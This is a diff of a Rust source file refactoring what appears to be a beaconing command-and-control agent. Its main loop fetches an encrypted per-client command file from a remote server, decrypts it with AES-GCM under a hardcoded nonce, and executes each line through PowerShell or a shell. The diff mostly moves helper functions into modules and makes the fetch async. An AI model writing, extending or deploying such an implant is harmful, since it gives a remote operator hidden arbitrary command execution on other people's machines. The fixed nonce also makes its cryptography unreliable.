@@ -1,7 +1,11 @@
+mod crypto;
+mod dev;
+
 use aes_gcm::{
     aead::{Aead, KeyInit},
     Aes256Gcm, Nonce,
 };
+use crypto::Crypto;
 use std::fs::File;
 use std::io::{BufRead, Write};
 use std::process::Command;
@@ -9,31 +13,20 @@ use std::{env, io};
 
 include!(concat!(env!("OUT_DIR"), "/id.rs"));
 
-pub fn run() {
+pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
+    let crypto = crypto::Crypto::build(encryption_key(), nonce())?;
+
     let args: Vec<String> = env::args().collect();
     if args.len() >= 2 {
-        let command = &args[1].to_lowercase();
-        match command.as_str() {
-            "show me the magic tangerine" => {
-                println!("{}", client_id());
-            }
-            "create my tangerine" => {
-                create_tangerine();
-            }
-            "hide my tangerine" => {
-                hide_tangerine();
-            }
-            &_ => panic!("No tangerine"),
-        }
-        return;
+        dev::execute_command(&args[1], client_id(), &crypto);
+        return Ok(());
     }
 
     // Eat my tangerine
     loop {
-        println!("Looping!");
-        let commands = read_tangerine();
-        println!("Got command");
+        let commands = read_tangerine(&crypto).await?;
         println!("Commands are {:?}", commands);
+
         for command in commands {
             let output = if cfg!(target_os = "windows") {
                 Command::new("powershell")
@@ -55,56 +48,14 @@ pub fn run() {
     }
 }
 
-fn create_tangerine() {
-    let mut file = File::create(format!("./commands/{}", client_id())).unwrap();
-    file.write(b"TANGERINE\n// ADD TANGERINES\n!TANGERINE")
-        .unwrap();
-}
-
-fn hide_tangerine() {
-    let file =
-        File::open(format!("./commands/{}", client_id())).expect("Expected command file to exist");
-    let mut lines = io::BufReader::new(file).lines();
-
-    // Skip header
-    let header = lines.next().unwrap().unwrap();
-    if header != "TANGERINE" {
-        eprintln!("Expected tangerine header");
-    }
-    let key = encryption_key();
-    let nonce = Nonce::from_slice(b"TANGERINE!!!");
-    let cipher = Aes256Gcm::new_from_slice(key.as_bytes()).unwrap();
-
-    let mut encrypted_lines = vec![];
-
-    for line in lines {
-        let line = line.unwrap();
-        if line.starts_with("//") || line.starts_with("!") {
-            // Skip comment
-            continue;
-        }
-
-        let ciphertext = cipher.encrypt(nonce, line.as_bytes()).unwrap();
-        encrypted_lines.push(ciphertext);
-    }
-
-    let mut file = File::create(format!("./commands/{}.tangerine", client_id())).unwrap();
-    file.write(b"TANGERINE_ENC\n").unwrap();
-    for line in encrypted_lines {
-        file.write(&line).unwrap();
-        file.write(b"\n").unwrap();
-    }
-    file.write(b"!TANGERINE_ENC").unwrap();
-}
-
-fn read_tangerine() -> Vec<String> {
-    let resp = reqwest::blocking::get(format!("{}/{}.tangerine", base_uri(), client_id())).unwrap();
-    let bytes = resp.bytes().unwrap();
+async fn read_tangerine(crypto: &Crypto<'_>) -> Result<Vec<String>, Box<dyn std::error::Error>> {
+    let bytes = reqwest::get(format!("{}/{}.tangerine", base_uri(), client_id()))
+        .await?
+        .bytes()
+        .await?;
     let mut lines = bytes.split(|byte| byte == &b'\n');
 
-    let key = encryption_key();
     let nonce = Nonce::from_slice(b"TANGERINE!!!");
-    let cipher = Aes256Gcm::new_from_slice(key.as_bytes()).unwrap();
 
     // Skip header
     let header = lines.next().unwrap();
@@ -118,8 +69,8 @@ fn read_tangerine() -> Vec<String> {
         if line == b"!TANGERINE_ENC" {
             continue;
         }
-        let decrypted = cipher.decrypt(nonce, line).unwrap();
+        let decrypted = crypto.cipher().decrypt(nonce, line).unwrap();
         decrypted_lines.push(String::from_utf8(decrypted).unwrap());
     }
-    decrypted_lines
+    Ok(decrypted_lines)
 }
